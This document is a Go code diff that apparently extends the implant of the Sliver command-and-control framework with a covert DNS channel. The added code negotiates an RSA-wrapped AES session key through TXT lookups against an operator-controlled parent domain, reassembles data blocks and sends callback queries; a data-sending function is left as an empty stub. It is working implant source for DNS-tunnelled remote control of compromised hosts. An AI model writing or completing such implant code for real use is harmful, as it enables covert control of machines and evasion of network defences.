@@ -3,6 +3,7 @@ package main
 import (
 	"crypto/rsa"
 	"crypto/x509"
+	"encoding/base32"
 	"encoding/base64"
 	"encoding/binary"
 	"encoding/pem"
@@ -32,7 +33,10 @@ type BlockReassembler struct {
 
 const (
 	domainKeySubdomain = "_domainkey"
-	nonceStdSize       = 4
+	nonceStdSize       = 6
+
+	// (n*8 + 4) / 5 = 63 means we can encode 39 bytes
+	byteBlockSize = 39
 
 	maxFetchTxts = 200 // How many txts to request at a time
 )
@@ -41,8 +45,25 @@ var (
 	dnsCharSet = []rune("abcdefghijklmnopqrstuvwxyz0123456789-_")
 )
 
-func dnsStartSession() {
+func dnsStartSession(parentDomain string) (string, AESKey, error) {
+	sessionKey := RandomAESKey()
+	pubKey := dnsGetServerPublicKey()
 
+	data, err := RSAEncrypt(sessionKey[:], pubKey)
+	if err != nil {
+		return "", AESKey{}, err
+	}
+	nonce := dnsNonce(nonceStdSize)
+	encoded := base32.StdEncoding.EncodeToString(data)
+	txts, err := net.LookupTXT(fmt.Sprintf("%s.%s.%s._si.%s", nonce, encoded, sliverName, parentDomain))
+	if 0 < len(txts) {
+		sessionID, err := GCMDecrypt(sessionKey, []byte(txts[0]))
+		if err != nil {
+			return "", AESKey{}, err
+		}
+		return string(sessionID), sessionKey, nil
+	}
+	return "", AESKey{}, errors.New("Invalid TXT response to session init")
 }
 
 func dnsGetServerPublicKey() *rsa.PublicKey {
@@ -76,7 +97,7 @@ func dnsGetServerPublicKey() *rsa.PublicKey {
 // LookupDomainKey - Attempt to get the server's RSA public key
 func LookupDomainKey(selector string, parentDomain string) ([]byte, error) {
 	selector = strings.ToLower(selector)
-	nonce := DNSNonce(nonceStdSize)
+	nonce := dnsNonce(nonceStdSize)
 	subdomain := fmt.Sprintf("_%s.%s.%s.%s", nonce, selector, domainKeySubdomain, parentDomain)
 	txts, err := net.LookupTXT(subdomain)
 	if err != nil {
@@ -95,8 +116,8 @@ func LookupDomainKey(selector string, parentDomain string) ([]byte, error) {
 	return getBlock(parentDomain, fields[0], fields[1])
 }
 
-// DNSNonce - Generate a nonce of a given size
-func DNSNonce(size int) string {
+// dnsNonce - Generate a nonce of a given size
+func dnsNonce(size int) string {
 	insecureRand.Seed(time.Now().UnixNano())
 	nonce := []rune{}
 	for i := 0; i < size; i++ {
@@ -104,6 +125,11 @@ func DNSNonce(size int) string {
 		nonce = append(nonce, dnsCharSet[index])
 	}
 	return string(nonce)
+}
+
+func sendBlock(parentDomain string, data []byte) error {
+
+	return nil
 }
 
 func getBlock(parentDomain string, blockID string, size string) ([]byte, error) {
@@ -144,12 +170,14 @@ func getBlock(parentDomain string, blockID string, size string) ([]byte, error) 
 	for _, buf := range data {
 		msg = append(msg, buf...)
 	}
+	nonce := dnsNonce(nonceStdSize)
+	go net.LookupTXT(fmt.Sprintf("%s.%s._cb.%s", nonce, reasm.ID, parentDomain))
 	return msg, nil
 }
 
 func fetchRecvBlock(parentDomain string, reasm *BlockReassembler, start int, stop int, wg *sync.WaitGroup) {
 	defer wg.Done()
-	nonce := DNSNonce(nonceStdSize)
+	nonce := dnsNonce(nonceStdSize)
 	subdomain := fmt.Sprintf("_%s.%d.%d.%s._b.%s", nonce, start, stop, reasm.ID, parentDomain)
 	log.Printf("[dns] fetch -> %s", subdomain)
 	txts, err := net.LookupTXT(subdomain)
@@ -158,7 +186,7 @@ func fetchRecvBlock(parentDomain string, reasm *BlockReassembler, start int, sto
 		log.Printf("Failed to fetch blocks %v", err)
 	}
 	for _, txt := range txts {
-		// Split on delim '.'
+		// Split on delim '.' because Windows strcat's multiple TXT records
 		for _, record := range strings.Split(txt, ".") {
 			if len(record) == 0 {
 				continue
